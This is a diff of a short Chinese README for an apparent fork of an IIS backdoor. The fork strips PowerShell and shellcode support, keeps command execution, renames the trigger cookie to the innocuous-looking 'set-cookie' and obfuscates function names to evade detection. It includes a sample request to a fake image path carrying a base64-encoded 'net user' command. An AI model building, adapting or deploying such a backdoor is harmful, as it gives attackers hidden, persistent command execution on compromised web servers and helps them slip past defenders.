@@ -1,5 +1,4 @@
-在原作基础上删除powershell和shellcode功能，只保留cmd功能
-
+参考WBGlIl大佬项目，删除powershell和shellcode功能，只保留cmd功能
 
 Cookie: cmd= 改成 Cookie: set-cookie=，对函数名进行混淆
 
@@ -10,7 +9,10 @@ GET /aspnet_client/system_web/iisstart.png HTTP/2
 Host: 192.168.42.128
 Cookie: set-cookie=bmV0IHVzZXI=
 ```
+---
 
+参考WBGlIl大佬项目  
+地址：https://github.com/WBGlIl/IIS_backdoor。
 
 主要是实现了3个功能执行cmd命令，C#调用powershell，执行shellcode
 
